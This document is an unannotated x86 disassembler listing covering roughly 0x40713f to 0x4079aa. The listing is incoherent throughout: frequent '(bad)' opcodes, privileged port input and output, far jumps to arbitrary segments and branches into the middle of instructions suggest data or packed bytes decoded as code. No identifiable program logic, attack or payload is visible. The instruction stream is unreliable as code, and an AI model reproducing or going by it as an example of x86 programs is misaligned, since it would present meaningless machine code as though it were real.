  40713f:	loope  0x40714f
  407141:	out    0xff,eax
  407143:	adc    ch,ch
  407145:	in     eax,0xac
  407147:	leave  
  407148:	repz ret 0xa8e4
  40714c:	mov    bh,0xf7
  40714e:	in     al,dx
  40714f:	(bad)  
  407150:	std    
  407151:	int    0xf0
  407153:	add    bh,dl
  407155:	(bad)  
  407156:	into   
  407157:	fsubr  st(7),st
  407159:	cmc    
  40715a:	add    ch,bl
  40715c:	fxch   st(1)
  40715e:	or     bh,al
  407160:	or     ah,dh
  407162:	or     al,0xa
  407164:	iret   
  407165:	lods   al,BYTE PTR ds:[esi]
  407166:	in     eax,dx
  407167:	out    0xb3,al
  407169:	loop   0x40713b
  40716b:	cli    
  40716c:	stc    
  40716d:	enter  0xc8ff,0xc9
  407171:	aam    0xe2
  407173:	mov    ecx,0xf8f6cef1
  407178:	rcr    edi,cl
  40717a:	shl    edx,0xe3
  40717d:	sti    
  40717e:	fcomip st,st(5)
  407180:	or     bl,dh
  407182:	jmp    0x40715d
  407184:	loop   0x407135
  407186:	out    0xc2,eax
  407188:	mov    bl,0xc1
  40718a:	div    DWORD PTR [edi-0x4f30091b]
  407190:	mov    ebp,0x2ffedd3
  407195:	mov    ecx,0xbaf5c1ee
  40719a:	add    esp,esp
  40719c:	rol    ebp,0x8
  40719f:	retf   0xe203
  4071a2:	(bad)  
  4071a3:	std    
  4071a4:	out    0xc2,eax
  4071a6:	loop   0x407184
  4071a8:	lods   al,BYTE PTR ds:[esi]
  4071a9:	out    0xf7,eax
  4071ab:	mov    al,0xf6
  4071ad:	mov    ebx,0xd6dfd0d1
  4071b2:	out    dx,al
  4071b3:	ffreep st(2)
  4071b5:	clc    
  4071b6:	(bad)  
  4071b8:	pop    es
  4071b9:	stc    
  4071ba:	add    al,0xd5
  4071bc:	std    
  4071bd:	(bad)  
  4071bf:	idiv   dl
  4071c1:	call   0xc4123fa8
  4071c6:	in     al,dx
  4071c7:	ret    
  4071c8:	aam    0xf7
  4071ca:	repnz (bad) 
  4071cc:	in     al,0xe0
  4071ce:	(bad)  
  4071cf:	(bad)  
  4071d0:	clc    
  4071d1:	aam    0xf6
  4071d3:	call   0xdb0260db
  4071d8:	shr    ah,0xeb
  4071db:	cmc    
  4071dc:	(bad)  
  4071dd:	out    dx,eax
  4071de:	iret   
  4071df:	test   BYTE PTR [ecx+ecx*1],0xd8
  4071e3:	adc    ah,ch
  4071e5:	fistp  QWORD PTR [esi-0x120d1c29]
  4071eb:	in     al,dx
  4071ec:	mov    al,0xf9
  4071ee:	(bad)  
  4071f0:	mov    ah,0xfa
  4071f2:	mov    eax,0xf5edd8f0
  4071f7:	add    bh,al
  4071f9:	(bad)  
  4071fa:	ret    
  4071fb:	jmp    0x4071c3
  4071fd:	pop    es
  4071fe:	fisttp DWORD PTR [edi]
  407200:	enter  0xdd0f,0xdd
  407204:	jmp    0xccea:0xf5f3c5b2
  40720b:	(bad)  
  40720c:	scas   eax,DWORD PTR es:[edi]
  40720d:	mov    eax,0xfcf4fdbb
  407212:	aam    0xbb
  407214:	mov    ebx,0xc6f8d8df
  407219:	mov    esi,0xfff6d70b
  40721e:	fmul   st(2),st
  407220:	jmp    0x40720d
  407222:	shl    ebx,cl
  407224:	(bad)  
  407225:	fmulp  st(2),st
  407227:	aad    0xc5
  407229:	loopne 0x4071f9
  40722b:	cmc    
  40722c:	rcl    edx,1
  40722e:	sti    
  40722f:	mov    ebx,0xd3c3ccc9
  407234:	idiv   DWORD PTR [esi-0x3aff0328]
  40723a:	cmc    
  40723b:	loop   0x40721f
  40723d:	clc    
  40723e:	add    dh,dh
  407240:	(bad)  
  407241:	in     eax,dx
  407242:	fucomip st,st(5)
  407244:	mov    ebp,0xc4cef6dd
  407249:	jmp    0xbbf55731
  40724e:	mov    bh,0xef
  407250:	iret   
  407251:	repnz add al,dl
  407254:	aad    0x7
  407256:	ret    0xf9ec
  407259:	push   es
  40725a:	std    
  40725b:	retf   
  40725c:	jmp    0xf94a744a
  407261:	fsubp  st(6),st
  407263:	jecxz  0x407216
  407265:	shl    dh,1
  407267:	(bad)  
  407268:	mov    esp,0xd6b6b0cf
  40726d:	in     al,0xff
  40726f:	(bad)  
  407271:	(bad)  
  407272:	fcomp  st(6)
  407274:	loopne 0x40726b
  407276:	add    edi,esi
  407278:	loope  0x40726c
  40727a:	mov    ebp,0xed4c90a
  40727f:	add    eax,0xe9dc00ea
  407284:	jmp    0x407237
  407286:	fdivr  QWORD PTR [esi-0x390e0d0f]
  40728c:	out    0xe0,eax
  40728e:	mov    ah,0xfd
  407290:	(bad)  
  407291:	mov    eax,0xe1c1dbda
  407296:	cmc    
  407297:	(bad)  
  407298:	mov    ebp,0xe604dbf9
  40729d:	(bad)  
  40729e:	stc    
  40729f:	mul    cl
  4072a1:	or     ecx,esi
  4072a3:	iret   
  4072a4:	out    dx,al
  4072a5:	les    ebp,FWORD PTR [eax-0xd3d2929]
  4072ab:	mov    ebx,0xd8b7b0f6
  4072b0:	mov    ah,0xb8
  4072b2:	(bad)  
  4072b4:	icebp  
  4072b5:	out    dx,eax
  4072b6:	aam    0xd0
  4072b8:	fldpi  
  4072ba:	cli    
  4072bb:	jmp    0xe20171b4
  4072c0:	iret   
  4072c1:	jmp    0xd41179cc
  4072c6:	jecxz  0x40729a
  4072c8:	lods   al,BYTE PTR ds:[esi]
  4072c9:	mov    dh,0xb3
  4072cb:	(bad)  
  4072cc:	out    dx,eax
  4072cd:	enter  0xe4d9,0xb6
  4072d1:	jecxz  0x4072b5
  4072d3:	xlat   BYTE PTR ds:[ebx]
  4072d4:	rcr    al,1
  4072d6:	cld    
  4072d7:	in     eax,0xbd
  4072d9:	hlt    
  4072da:	fild   WORD PTR [esi+ebx*8]
  4072dd:	jmp    0xc06:0xde2cbf5
  4072e4:	scas   al,BYTE PTR es:[edi]
  4072e5:	jmp    0xfc2966b0
  4072ea:	mov    cl,0xe6
  4072ec:	out    dx,al
  4072ed:	enter  0xeef9,0xc5
  4072f1:	div    DWORD PTR [esi+edx*8-0x2c110448]
  4072f8:	loope  0x4072b7
  4072fa:	repnz cmc 
  4072fc:	std    
  4072fd:	(bad)  
  4072fe:	jmp    0xc8e1:0xe7c2ecfd
  407305:	into   
  407306:	scas   eax,DWORD PTR es:[edi]
  407307:	fnsave [ebx-0x30294c3d]
  40730d:	mov    ch,0xfb
  40730f:	jmp    0xe22e60e3
  407314:	into   
  407315:	cmc    
  407316:	fdivr  QWORD PTR [ebp-0x383f28ff]
  40731c:	retf   
  40731d:	(bad)  
  40731e:	(bad)  
  40731f:	aad    0xfe
  407321:	jmp    0xe9337939
  407326:	fsub   st(2),st
  407328:	test   al,0xce
  40732b:	rol    ecx,0xd5
  40732e:	stc    
  40732f:	repz in eax,0x3
  407332:	add    ebp,edi
  407334:	fadd   DWORD PTR [edx]
  407336:	mov    eax,0xfc02d6d9
  40733b:	fimul  DWORD PTR [ecx]
  40733d:	shr    al,1
  40733f:	add    bl,al
  407341:	call   DWORD PTR [edx]
  407343:	out    0xbc,al
  407345:	jmp    0xf836403c
  40734a:	out    dx,eax
  40734b:	in     al,dx
  40734c:	repz retf 0xbae6
  407350:	out    dx,eax
  407351:	sti    
  407352:	retf   0x2d2
  407355:	repz mov esi,0x7d4f906
  40735b:	loope  0x407321
  40735d:	push   es
  40735e:	enter  0xc5eb,0xc2
  407362:	in     al,0x7
  407364:	shl    DWORD PTR [eax-0x1950481e],cl
  40736a:	leave  
  40736b:	shl    ecx,0xd8
  40736e:	out    0xeb,al
  407370:	into   
  407371:	mov    esi,0xbcd8d603
  407376:	sti    
  407377:	mov    eax,0xd705bebc
  40737c:	add    ebx,esp
  40737e:	loope  0x407384
  407380:	call   0xc5225374
  407385:	loope  0x407364
  407387:	mov    esi,0xb7f0e1c7
  40738c:	mov    ecx,0xffd6caba
  407391:	retf   
  407392:	fiadd  DWORD PTR [ebx]
  407394:	mov    esi,0xd1d5b5e7
  407399:	hlt    
  40739a:	mov    esp,0xe8c8ead6
  40739f:	jmp    0x34d3982
  4073a4:	lods   al,BYTE PTR ds:[esi]
  4073a5:	jmp    0x40738d
  4073a7:	out    dx,eax
  4073a8:	loop   0x40736c
  4073aa:	jmp    0xcd1b4d63
  4073af:	jmp    0xd8d9:0xd2dbccef
  4073b6:	fsubp  st(5),st
  4073b8:	cld    
  4073b9:	ret    0xf104
  4073bc:	icebp  
  4073bd:	aam    0xc8
  4073bf:	fsubr  st(6),st
  4073c1:	or     ebp,ecx
  4073c3:	stc    
  4073c4:	repz iret 
  4073c6:	enter  0xc5b0,0xf1
  4073ca:	mov    bl,0xf1
  4073cc:	into   
  4073cd:	retf   
  4073ce:	mov    ah,0xd5
  4073d0:	shl    ah,cl
  4073d2:	aam    0xf4
  4073d4:	jmp    0xf838509c
  4073d9:	loope  0x407394
  4073db:	fldl2t 
  4073dd:	add    ah,dh
  4073df:	in     eax,0x8
  4073e1:	cld    
  4073e2:	add    eax,0xc8cac304
  4073e7:	ror    esp,1
  4073e9:	int    0xd0
  4073eb:	aam    0xe7
  4073ed:	mov    ebx,0xedd5c8cb
  4073f2:	loop   0x4073f1
  4073f4:	sar    DWORD PTR [edx+edx*8-0x21f83841],1
  4073fb:	add    ebp,edi
  4073fd:	sar    edx,0xd4
  407400:	ffreep st(5)
  407402:	or     al,BYTE PTR [ecx]
  407404:	(bad)  
  407405:	jmp    0xe1f6:0xe8b2bdce
  40740c:	shl    DWORD PTR [ebp-0xf150d17],1
  407412:	jmp    0x40740a
  407414:	cli    
  407415:	enter  0xd6,0xd9
  407419:	in     al,0xdf
  40741b:	icebp  
  40741c:	shl    ebx,1
  40741e:	out    dx,al
  40741f:	inc    ah
  407421:	ffreep st(4)
  407423:	in     eax,dx
  407424:	(bad)
  407427:	lods   eax,DWORD PTR ds:[esi]
  407428:	aad    0xea
  40742a:	int    0xd4
  40742c:	(bad)  
  40742d:	(bad)  
  40742e:	lock fucom st(4)
  407431:	jmp    0xfc125703
  407436:	icebp  
  407437:	loopne 0x40740b
  407439:	sar    ebx,0x6
  40743c:	leave  
  40743d:	shl    ah,0xcf
  407440:	iret   
  407441:	ret    0xcbf2
  407444:	fcom   st(2)
  407446:	fucomp st(0)
  407448:	(bad)  
  407449:	loopne 0x40740d
  40744b:	shr    esi,1
  40744d:	rcr    dh,1
  40744f:	mov    dh,0xf9
  407451:	int3   
  407452:	out    dx,al
  407453:	loop   0x407448
  407455:	sar    esp,0xc1
  407458:	hlt    
  407459:	pop    es
  40745a:	ret    
  40745b:	out    0xfd,al
  40745d:	add    DWORD PTR [edx],ecx
  40745f:	(bad)  
  407461:	jmp    0xc2eb:0xcfccede6
  407468:	jecxz  0x407420
  40746a:	test   eax,0xe5b1dbbb
  40746f:	mov    bh,0xf6
  407471:	cld    
  407472:	out    dx,al
  407473:	aad    0x1
  407475:	pop    es
  407476:	in     al,dx
  407477:	(bad)  
  407478:	(bad)  
  40747a:	stc    
  40747b:	ret    0xe2fd
  40747e:	add    dl,ah
  407480:	add    eax,0xf208df0e
  407485:	fucom  st(5)
  407487:	in     al,dx
  407488:	loopne 0x40747a
  40748a:	jecxz  0x40745a
  40748c:	scas   eax,DWORD PTR es:[edi]
  40748d:	shl    bl,0xf8
  407490:	hlt    
  407491:	sti    
  407492:	fst    st(1)
  407494:	out    dx,eax
  407495:	rol    dl,0xf6
  407498:	int3   
  407499:	rcr    al,cl
  40749b:	shl    dh,cl
  40749d:	shr    ecx,0x3
  4074a0:	retf   0xe9e5
  4074a3:	leave  
  4074a4:	in     eax,0xf1
  4074a6:	mov    esp,0xece6c3ea
  4074ab:	jmp    0xdfe5:0xf9ece5f8
  4074b2:	hlt    
  4074b3:	fmul   st(1),st
  4074b5:	shl    ebp,cl
  4074b7:	mov    esi,0x1c6e3e1
  4074bc:	cmc    
  4074bd:	(bad)  
  4074be:	(bad)  
  4074bf:	jmp    ebp
  4074c1:	out    0xd,al
  4074c3:	push   cs
  4074c4:	(bad)  
  4074c6:	in     eax,0xed
  4074c8:	mul    al
  4074ca:	(bad)  
  4074cc:	in     al,dx
  4074cd:	clc    
  4074ce:	mov    eax,0xf3efc9b6
  4074d3:	iret   
  4074d4:	icebp  
  4074d5:	add    bh,al
  4074d7:	clc    
  4074d8:	add    edi,esp
  4074da:	icebp  
  4074db:	(bad)  
  4074dc:	rol    DWORD PTR ds:0xcb0806cb,1
  4074e2:	(bad)  
  4074e4:	mov    cl,0xe7
  4074e6:	ffree  st(2)
  4074e8:	in     al,dx
  4074e9:	(bad)  
  4074ea:	mov    dl,0xf0
  4074ec:	int    0xd6
  4074ee:	call   0xfa3447e1
  4074f3:	std    
  4074f4:	mov    bh,0xc1
  4074f6:	mov    ch,0xbc
  4074f8:	icebp  
  4074f9:	repz jmp 0x4074fd
  4074fc:	add    al,0x4
  4074fe:	cld    
  4074ff:	push   es
  407500:	stc    
  407501:	(bad)  
  407502:	fisttp WORD PTR [edi]
  407504:	shr    cl,cl
  407506:	loope  0x4074f1
  407508:	call   0xca0729f5
  40750d:	sti    
  40750e:	fadd   st,st(5)
  407510:	repnz std 
  407512:	cmc    
  407513:	fmul   st(1),st
  407515:	sti    
  407516:	fiadd  WORD PTR [eax]
  407518:	in     eax,0x3
  40751a:	repz mov esp,0xc904c5e1
  407520:	add    ch,cl
  407522:	(bad)  
  407525:	shr    esp,0xce
  407528:	fsub   st(3),st
  40752a:	cmc    
  40752b:	shl    ebx,cl
  40752d:	fdiv   DWORD PTR [eax-0xd292538]
  407533:	(bad)  
  407535:	faddp  st(0),st
  407537:	rol    esi,cl
  407539:	mul    ah
  40753b:	fsubrp st(5),st
  40753d:	test   DWORD PTR [ebx],0xefd9cd01
  407543:	or     esi,eax
  407545:	jmp    0xe737532f
  40754a:	retf   
  40754b:	mov    ebx,0xe5d6f8bb
  407550:	aad    0xd5
  407552:	mov    ch,0xc2
  407554:	loope  0x40754b
  407556:	add    BYTE PTR [edi-0x50b2c1d],bh
  40755c:	or     bh,BYTE PTR [esi-0x101c0209]
  407562:	out    dx,al
  407563:	repz jecxz 0x40754b
  407566:	(bad)  
  407567:	jecxz  0x407516
  407569:	jmp    0x40754f
  40756b:	mov    al,0xd9
  40756d:	mov    eax,0xe8f2e9ca
  407572:	mov    esi,0xefdec2bf
  407577:	add    BYTE PTR [esi],al
  407579:	std    
  40757a:	ret    
  40757b:	fadd   st(2),st
  40757d:	out    0xf,al
  40757f:	or     edi,eax
  407581:	jmp    0x40754d
  407583:	cld    
  407584:	jmp    0x407571
  407586:	out    0xa4,eax
  407588:	(bad)  
  407589:	shr    edi,1
  40758b:	jmp    0xeeb7:0xd0b9f4e1
  407592:	clc    
  407593:	mov    al,0xd5
  407595:	(bad)  
  407596:	pop    es
  407597:	cmc    
  407598:	hlt    
  407599:	lock (bad) 
  40759b:	ror    DWORD PTR [eax],1
  40759d:	les    eax,FWORD PTR [ecx]
  40759f:	(bad)  
  4075a0:	clc    
  4075a1:	retf   0xdf12
  4075a4:	in     eax,0xcb
  4075a6:	in     al,0xe9
  4075a8:	aad    0xb1
  4075aa:	shl    bh,1
  4075ac:	out    dx,al
  4075ad:	shl    dh,cl
  4075af:	lods   al,BYTE PTR ds:[esi]
  4075b0:	sti    
  4075b1:	into   
  4075b2:	icebp  
  4075b3:	rol    dl,1
  4075b5:	repz (bad) 
  4075b7:	in     al,dx
  4075b8:	fucom  st(2)
  4075ba:	shl    bl,cl
  4075bc:	sti    
  4075bd:	clc    
  4075be:	rcl    esi,0xfc
  4075c1:	push   es
  4075c2:	fcmovnb st,st(4)
  4075c4:	ret    
  4075c5:	shl    al,0xc7
  4075c8:	in     al,dx
  4075c9:	call   0xb3262994
  4075ce:	rcr    edx,cl
  4075d0:	fcomip st,st(6)
  4075d2:	int3   
  4075d3:	out    dx,al
  4075d4:	ret    
  4075d5:	rol    DWORD PTR [ecx],1
  4075d7:	cmc    
  4075d8:	ret    0xc2ec
  4075db:	retf   0xd9e7
  4075de:	xlat   BYTE PTR ds:[ebx]
  4075df:	add    cl,bh
  4075e1:	add    bh,bl
  4075e3:	or     al,0xc0
  4075e5:	shl    dl,0xd1
  4075e8:	jecxz  0x4075c1
  4075ea:	(bad)  
  4075eb:	xlat   BYTE PTR ds:[ebx]
  4075ec:	jmp    0xb9ed3ba7
  4075f1:	cmc    
  4075f2:	cld    
  4075f3:	sti    
  4075f4:	jmp    0x1477cdb
  4075f9:	in     al,dx
  4075fa:	loop   0x4075e6
  4075fc:	cmc    
  4075fd:	test   DWORD PTR [ecx],0x4c6d404
  407603:	or     cl,ah
  407605:	lods   eax,DWORD PTR ds:[esi]
  407606:	jecxz  0x4075e9
  407608:	xlat   BYTE PTR ds:[ebx]
  407609:	jmp    0xd5bb:0xb2d5acda
  407610:	in     al,dx
  407611:	push   DWORD PTR [ecx-0x463d2fff]
  407617:	(bad)  
  407619:	fdivrp st(2),st
  40761b:	add    cl,dh
  40761d:	out    0x0,eax
  40761f:	cli    
  407620:	in     eax,dx
  407621:	cli    
  407622:	(bad)  
  407623:	call   0xe21735ec
  407628:	(bad)  
  407629:	(bad)  
  40762a:	ret    
  40762b:	mov    bh,0xd7
  40762d:	not    ebp
  40762f:	out    dx,eax
  407630:	lock mov edx,0xd6f4ddfd
  407636:	rcr    esi,1
  407638:	icebp  
  407639:	repnz std 
  40763b:	aam    0x5
  40763d:	mov    BYTE PTR [ecx],0xe4
  407640:	leave  
  407641:	add    eax,0xa8c008f8
  407646:	fsubrp st(0),st
  407648:	icebp  
  407649:	ret    
  40764a:	icebp  
  40764b:	aam    0xb0
  40764d:	cli    
  40764e:	fucomip st,st(3)
  407650:	fcomp  st(2)
  407652:	cmc    
  407653:	fnstsw WORD PTR [eax-0x1c42132a]
  407659:	stc    
  40765a:	cli    
  40765b:	clc    
  40765c:	(bad)  
  40765e:	psubd  mm5,mm7
  407661:	fisttp DWORD PTR [esi]
  407663:	add    ebp,ebx
  407665:	mov    cl,0xd7
  407667:	mov    bl,0xcd
  407669:	lods   al,BYTE PTR ds:[esi]
  40766a:	mov    ch,0xf3
  40766c:	hlt    
  40766d:	mov    al,0xd6
  40766f:	call   0xd73c7660
  407674:	add    edi,eax
  407676:	loop   0x407652
  407678:	clc    
  407679:	icebp  
  40767a:	lock in eax,0xdd
  40767d:	or     al,bh
  40767f:	rol    BYTE PTR [esp+eiz*8],0xe7
  407683:	out    0xa9,al
  407685:	in     eax,0xbd
  407687:	scas   al,BYTE PTR es:[edi]
  407688:	fmul   st(0),st
  40768a:	aad    0xb3
  40768c:	mov    edx,0xfcddf7b2
  407691:	fnstsw WORD PTR [ebx-0x26290148]
  407697:	in     eax,dx
  407698:	(bad)
  40769b:	jecxz  0x407660
  40769d:	in     al,0x9
  40769f:	sti    
  4076a0:	or     al,BYTE PTR [ecx]
  4076a2:	fdivr  st,st(5)
  4076a4:	mov    cl,0xa8
  4076a6:	into   
  4076a7:	out    dx,eax
  4076a8:	ret    
  4076a9:	bnd jmp 0xd62f5b97
  4076af:	sti    
  4076b0:	jmp    0x4076ad
  4076b2:	xlat   BYTE PTR ds:[ebx]
  4076b3:	fcomip st,st(3)
  4076b5:	stc    
  4076b6:	sti    
  4076b7:	(bad)  
  4076b8:	(bad)  
  4076b9:	cld    
  4076ba:	aam    0xc2
  4076bc:	jmp    0x407685
  4076be:	(bad)  
  4076c0:	std    
  4076c1:	add    eax,0xe0dfcb06
  4076c6:	mov    esi,0xd2ccf5eb
  4076cb:	jmp    0xcaea:0xacd4cfd6
  4076d2:	(bad)  
  4076d3:	mov    ebp,0xedd0b9bc
  4076d8:	(bad)  
  4076d9:	(bad)  
  4076db:	pop    es
  4076dc:	inc    DWORD PTR [edx]
  4076de:	out    0xf8,al
  4076e0:	(bad)  
  4076e2:	enter  0xe0ea,0xcc
  4076e6:	ret    
  4076e7:	lock loope 0x4076e1
  4076ea:	leave  
  4076eb:	(bad)
  4076ee:	int3   
  4076ef:	out    dx,eax
  4076f0:	jmp    0xf4be:0xd1ede8b2
  4076f7:	fdivr  DWORD PTR [ebp-0x7f91d06]
  4076fd:	fcmovbe st,st(5)
  4076ff:	cld    
  407700:	hlt    
  407701:	jmp    0xc6b0:0xcdcb08f2
  407708:	icebp  
  407709:	retf   
  40770a:	in     al,dx
  40770b:	repnz in eax,0xca
  40770e:	int3   
  40770f:	into   
  407710:	ror    ebx,1
  407712:	mov    ah,0xf3
  407714:	hlt    
  407715:	fst    st(2)
  407717:	in     eax,dx
  407718:	mov    ebx,0xd602d6f9
  40771d:	stc    
  40771e:	mov    ebp,0xedad4eb
  407723:	out    0xd1,al
  407725:	ret    0xd5f6
  407728:	aam    0xc3
  40772a:	in     al,0xe0
  40772c:	fucomi st,st(6)
  40772e:	clc    
  40772f:	xlat   BYTE PTR ds:[ebx]
  407730:	jmp    0xdfd6:0xd0dff403
  407737:	cli    
  407738:	fxam   
  40773a:	add    eax,0xafbc4
  40773f:	or     bl,al
  407741:	int3   
  407742:	or     al,al
  407744:	mov    eax,0xd5c0e4c6
  407749:	leave  
  40774a:	out    0xc4,eax
  40774c:	in     eax,dx
  40774d:	in     eax,dx
  40774e:	mov    dh,0xee
  407750:	mov    ebp,0xbcd6d3f3
  407755:	into   
  407756:	sti    
  407757:	mov    edi,0xe2d5f0c0
  40775c:	cli    
  40775d:	or     bl,ah
  40775f:	or     eax,esp
  407761:	push   cs
  407762:	rcl    edx,cl
  407764:	int    0xdf
  407766:	mov    esi,0xf5e6c1e7
  40776b:	mov    dh,0xb2
  40776d:	repnz stc 
  40776f:	std    
  407770:	fmulp  st(7),st
  407772:	cld    
  407773:	loop   0x407752
  407775:	aad    0xc0
  407777:	fstp   st(6)
  407779:	repnz or bl,al
  40777c:	fadd   DWORD PTR [edx]
  40777e:	(bad)  
  407781:	or     ebp,ebx
  407783:	jmp    eax
  407785:	mov    esp,0xb2b0f5e2
  40778a:	xlat   BYTE PTR ds:[ebx]
  40778b:	stc    
  40778c:	enter  0xf7d3,0xed
  407790:	jmp    0x40776c
  407792:	idiv   DWORD PTR [esi-0x39301e2e]
  407798:	aad    0xd4
  40779a:	out    0xe6,al
  40779c:	clc    
  40779d:	rol    esp,0xe9
  4077a0:	out    dx,al
  4077a1:	add    dl,cl
  4077a3:	repnz in al,dx
  4077a5:	(bad)  
  4077a6:	mov    bl,0xcb
  4077a8:	aad    0xb7
  4077aa:	in     eax,dx
  4077ab:	(bad)
  4077ae:	(bad)  
  4077af:	mov    edi,0xbeeedbb9
  4077b4:	mov    esi,0xe3f7ee07
  4077b9:	loop   0x4077bb
  4077bb:	(bad)
  4077be:	jecxz  0x4077ad
  4077c0:	out    dx,eax
  4077c1:	out    dx,al
  4077c2:	(bad)  
  4077c3:	std    
  4077c4:	shr    esi,1
  4077c6:	retf   0xadb0
  4077c9:	sti    
  4077ca:	lods   al,BYTE PTR ds:[esi]
  4077cb:	shl    BYTE PTR [esi-0xe284947],cl
  4077d1:	mov    ebp,0xb8f1bed1
  4077d6:	icebp  
  4077d7:	push   esp
  4077d9:	rol    DWORD PTR [ebx],1
  4077db:	xlat   BYTE PTR ds:[ebx]
  4077dc:	(bad)  
  4077dd:	or     al,ch
  4077df:	(bad)  
  4077e0:	call   0xb8485fd0
  4077e5:	sar    BYTE PTR [edi-0x313e1c15],0xb3
  4077ec:	mov    ah,0xf2
  4077ee:	enter  0xf4d4,0xfc
  4077f2:	iret   
  4077f3:	(bad)  
  4077f5:	in     eax,dx
  4077f6:	out    0xf7,eax
  4077f8:	(bad)  
  4077f9:	(bad)  
  4077fb:	add    ebp,edx
  4077fd:	add    esi,edi
  4077ff:	(bad)  
  407800:	out    dx,al
  407801:	(bad)  
  407802:	ficom  DWORD PTR [ebx]
  407804:	ret    0xafd2
  407807:	jecxz  0x4077f7
  407809:	stos   BYTE PTR es:[edi],al
  40780a:	rcl    ecx,0xb4
  40780d:	in     eax,0xfb
  40780f:	test   ebp,0xdbf9fdf3
  407815:	add    dl,ah
  407817:	int3   
  407818:	loop   0x4077f9
  40781a:	loopne 0x4077f4
  40781c:	ret    0xfe2
  40781f:	(bad)  
  407820:	enter  0xcccd,0xfc
  407824:	loop   0x40780d
  407826:	ret    
  407827:	(bad)  
  407829:	(bad)  
  40782a:	cli    
  40782b:	in     eax,dx
  40782c:	retf   
  40782d:	stc    
  40782e:	mov    ebx,0xecb2d0f8
  407833:	mul    edx
  407835:	xlat   BYTE PTR ds:[ebx]
  407836:	xlat   BYTE PTR ds:[ebx]
  407837:	fadd   st,st(7)
  407839:	in     eax,0xf7
  40783b:	shl    ah,cl
  40783d:	cld    
  40783e:	in     al,0xfa
  407840:	fdivr  st(4),st
  407842:	or     BYTE PTR [ecx],cl
  407844:	stos   DWORD PTR es:[edi],eax
  407845:	repz fnsave [edx-0x4d390b0a]
  40784c:	repnz mov dh,0xb7
  40784f:	lock cli 
  407851:	add    esi,edi
  407853:	(bad)  
  407854:	rcl    esp,cl
  407856:	mov    esi,0xfc07dfbc
  40785b:	ret    
  40785c:	loope  0x40784d
  40785e:	out    dx,al
  40785f:	fcmovbe st,st(5)
  407861:	jecxz  0x40784a
  407863:	jmp    0x407856
  407865:	int    0xb1
  407867:	lods   eax,DWORD PTR ds:[esi]
  407868:	mov    bl,0xfb
  40786a:	lods   eax,DWORD PTR ds:[esi]
  40786b:	cmc    
  40786c:	jmp    0xd5f16c5d
  407871:	(bad)  
  407872:	dec    ecx
  407874:	loope  0x40782c
  407876:	std    
  407877:	add    edi,DWORD PTR [ebp-0x3c353910]
  40787d:	loop   0x407853
  40787f:	out    0xe4,eax
  407881:	(bad)  
  407883:	in     eax,0xcc
  407885:	rol    eax,0xbc
  407888:	iret   
  407889:	shl    ah,1
  40788b:	neg    eax
  40788d:	fldl2e 
  40788f:	repnz retf 0xb8dc
  407893:	rcl    ecx,1
  407895:	fadd   st(1),st
  407897:	shr    ah,0xba
  40789a:	(bad)  
  40789b:	in     al,0xc2
  40789d:	(bad)  
  40789f:	in     eax,0xe2
  4078a1:	into   
  4078a2:	shl    ecx,0xab
  4078a5:	scas   al,BYTE PTR es:[edi]
  4078a6:	mov    bh,0xf5
  4078a8:	scas   al,BYTE PTR es:[edi]
  4078a9:	enter  0xe7c6,0xe5
  4078ad:	in     eax,dx
  4078ae:	(bad)  
  4078af:	fcomi  st,st(2)
  4078b1:	jecxz  0x4078ae
  4078b3:	add    edi,DWORD PTR [edi-0x2b0333f9]
  4078b9:	fdivrp st(3),st
  4078bb:	(bad)  
  4078bd:	or     DWORD PTR [edx],ecx
  4078bf:	fmul   st(1),st
  4078c1:	dec    DWORD PTR [ecx+esi*8]
  4078c4:	scas   al,BYTE PTR es:[edi]
  4078c5:	rcr    esi,0xf2
  4078c8:	jmp    0x40787f
  4078ca:	jmp    0x40789e
  4078cc:	retf   0xf0d7
  4078cf:	jmp    0x4078c4
  4078d1:	mov    eax,0xd5d4cad1
  4078d6:	shl    ecx,cl
  4078d8:	stc    
  4078d9:	faddp  st(2),st
  4078db:	fadd   QWORD PTR [ecx]
  4078dd:	add    al,0xf
  4078df:	add    ebx,ecx
  4078e1:	(bad)  
  4078e2:	(bad)  
  4078e3:	jmp    0xd1c2:0xf2e7e8ab
  4078ea:	les    esi,FWORD PTR [esi-0x4b0a2525]
  4078f0:	retf   
  4078f1:	lock rcr ebx,cl
  4078f4:	loope  0x4078b4
  4078f6:	in     al,dx
  4078f7:	(bad)  
  4078f8:	loope  0x4078c0
  4078fa:	jmp    0x4078e7
  4078fc:	cld    
  4078fd:	cli    
  4078fe:	pop    es
  4078ff:	(bad)  
  407900:	loop   0x4078f0
  407902:	(bad)  
  407903:	fmul   st,st(4)
  407905:	retf   
  407906:	mov    esi,0xe2efe8e3
  40790b:	iret   
  40790c:	int    0xce
  40790e:	fxam   
  407910:	shl    DWORD PTR [ebp-0x2cfc4004],cl
  407916:	aad    0xdb
  407918:	add    dl,bh
  40791a:	mov    ebp,0xd704c605
  40791f:	or     ch,cl
  407921:	retf   0xedc5
  407924:	loopne 0x4078f6
  407926:	out    dx,al
  407927:	out    dx,eax
  407928:	mov    dh,0xb7
  40792a:	out    0xb1,al
  40792c:	call   0xed0f34f9
  407931:	jmp    0xc0cc:0xcfbfb9f7
  407938:	(bad)  
  407939:	(bad)  
  40793b:	rcr    dh,0xf5
  40793e:	jmp    0xbe11:0xfce600fc
  407945:	int3   
  407946:	rcl    dh,1
  407948:	repnz icebp 
  40794a:	(bad)  
  40794b:	lock aam 0xfb
  40794e:	fldln2 
  407950:	stc    
  407951:	ror    edi,cl
  407953:	in     al,dx
  407954:	cld    
  407955:	call   0xf735375b
  40795a:	stc    
  40795b:	clc    
  40795c:	aam    0xd4
  40795e:	mov    bh,0xc4
  407961:	loope  0x40796f
  407963:	leave  
  407964:	mov    bl,0xdf
  407966:	mov    bl,0xc5
  407968:	lock int 0xf6
  40796b:	mov    ah,0xb9
  40796d:	out    dx,al
  40796e:	mov    esp,0xfdcfb4f8
  407974:	aad    0xb8
  407976:	rcr    cl,0xdf
  407979:	fdivr  QWORD PTR [ecx-0x1c293919]
  40797f:	(bad)  
  407980:	in     al,dx
  407981:	or     bl,dh
  407983:	call   0xf7244c6e
  407988:	shl    DWORD PTR [ebx-0x151e2633],cl
  40798e:	retf   0xffed
  407991:	cmc    
  407992:	in     eax,dx
  407993:	cli    
  407994:	fst    st(6)
  407996:	into   
  407997:	shr    ah,1
  407999:	(bad)  
  40799a:	ret    
  40799b:	add    eax,edi
  40799d:	stc    
  40799e:	loopne 0x407968
  4079a0:	iret   
  4079a1:	into   
  4079a2:	ficom  DWORD PTR [edx]
  4079a4:	mov    eax,0xe4f2f1c2
  4079aa:	shl    BYTE PTR [edi-0x3105373f],cl
